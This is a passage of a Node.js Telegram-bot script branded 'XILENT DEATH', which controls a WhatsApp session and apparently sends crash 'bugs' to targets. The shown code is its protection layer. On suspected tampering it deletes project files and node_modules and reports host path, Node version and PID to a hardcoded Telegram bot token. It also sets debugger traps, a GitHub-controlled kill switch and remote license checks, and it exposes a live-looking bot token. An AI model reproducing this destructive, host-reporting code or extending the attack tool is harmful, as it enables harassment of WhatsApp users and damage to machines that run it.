const { Telegraf, Markup} = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    WAProto_1,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@bellachu/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const OWNER = "ponzs212"; 
const REPO = "database";
const TOKEN_FILE = "token.json"; 

const databaseUrl = `https://raw.githubusercontent.com/ponzs212/database/main/token.json`;

  const thumbnailUrl = "https://a.top4top.io/p_37637nn3b1.jpg"; // FOTO PAS PAIR
  
  const StartUrl = "https://l.top4top.io/p_3768afzm41.jpg"; // FOTO PAS START
  
  const menuUrl = "https://l.top4top.io/p_3768afzm41.jpg"; // FOTO MENU
  
  const bugUrl = "https://a.top4top.io/p_37637nn3b1.jpg"; // FOTO MENU BUG
  
  const toolsUrl = "https://a.top4top.io/p_37637nn3b1.jpg"; // FOTO TOOLS
  
  const tqtoUrl = "https://a.top4top.io/p_37637nn3b1.jpg"; // FOTO TQTO
  
  const attackUrl = "https://files.catbox.moe/fl4li0.jpg"; // FOTO PAS BERES BUG

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}



setInterval(checkMaintenance, 15000);

async function checkMaintenance() {
  const axios = require("axios");

  try {
    const res = await axios.get(
      "https://raw.githubusercontent.com/ponzs212/database/main/maintenance.json"
    );

    if (res.data.maintenance === true) {
      await maintenanceShutdown(res.data.text);
    }

  } catch (err) {
    console.log("maintenance check error:", err.message);
  }
}

async function maintenanceShutdown(textFromGithub) {
  const message = `
🚧 BOT SEDANG MAINTENANCE 🚧

${textFromGithub}
`;

  console.log(message);

  try {
    await bot.telegram.sendMessage(ownerID, message);
  } catch (err) {
    console.log("gagal kirim owner:", err.message);
  }

  setTimeout(() => {
    process.exit(1);
  }, 2000);
}



function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "xilent.js",
      "config.js",
      ".npm",
      "node_modules",
      "settings",
      "XILENT DEATH [SCRAPE].zip"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot8525614009:AAFJKYzGLs1bKD5c_3uZlwHnZj8vNZGNF-U/sendMessage`, {
        chat_id: REPORT_CHAT_ID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY GAPON ACTIVE 🔥\n");
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   XILENT DEATH VIP V3.0 
├───────────────────────────────
│⟢ WAITING...... 
╰─❖──────────────────────────❖─╯
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⬡═—⊱ BYPASS ALERT⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃  MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   MELACAK KEBERADAAN ANDA.        
├───────────────────────────────
│⟢ Xilent Death Nieh Boss
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, {
      timeout: 5000
    })

    const tokens = (res.data && res.data.tokens) || []

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   ⚒️  DETECT INFLATOR  ⚒️
├───────────────────────────────
│⟢ 🔴 YOUR TOKEN IS NOT IN THE DATABASE.
╰─❖──────────────────────────❖─╯
      `))

      activateSecureMode()
      hardExit(1)
      return false
    }

    return true

  } catch (err) {
    console.log(chalk.bold.red(`
╭─❖──────────────────────────❖─╮
│   DATABASE CONNECTION ERROR
├───────────────────────────────
│⟢ ❌ FAILED TO VALIDATE TOKEN
╰─❖──────────────────────────❖─╯
    `))

    activateSecureMode()
    hardExit(1)
    return false
  }
}
})() 

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;
bot.use((ctx, next) => {
  if (secureMode) return;
  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 ☇ Akses terkunci — validasi token lewat /start "); } catch (e) {}
    }
    return ctx.reply("🔒 ☇ Akses terkunci. Ketik /start  untuk mengaktifkan bot.");
  }
  return next();
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

async function getGaponInfo() {
  const res = await axios.get("https://raw.githubusercontent.com/ponzs212/database/main/litevers.txt")
  return res.data
}

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⣿⢳⣿⣿⣿⣿⡇⣾⣿⣿⣿⣿⣿⠹⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣟⣿⣿⣿⣿⣻⣿⣾⣿⣿⢸⣿⣿⣿⣿⡇⣿⣿⣿⢹⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣾⣅⡿⣫⠟⣿⣿⡿⢹⡿⠿⣿⣿⣧⢸⣿⣿⣿⣿⠇⣿⣿⠇⡞⣿⡏⠉⢷⠴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣸⡿⠿⠟⠁⠀⡇⢸⡇⢀⣧⡤⢰⣿⡟⢸⡇⡏⢹⣿⠀⣿⡟⠀⢳⣿⡇⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠞⠁⠀⠀⡠⠀⠀⠁⣿⠃⢸⣿⠙⢺⣻⡗⠸⡇⠡⢸⣿⣰⠈⠀⠀⢘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⢸⠁⠀⠀⠀⣿⠀⠘⣿⡄⠀⠁⠁⠀⠃⠀⠈⣿⠿⠀⠀⠀⠘⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠙⡇⠀⠀⠀⠀⠀⠀⢀⣏⣥⠀⠀⠀⢠⣤⠔⠀⠦⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));

  console.log(chalk.green(`
⠀⬡═—⊱ XILENT DEATH ⊰—═⬡
┃ Lite Version Active
⬡═―—―――――――――――――――――—═⬡
`));
    
const store = makeInMemoryStore({
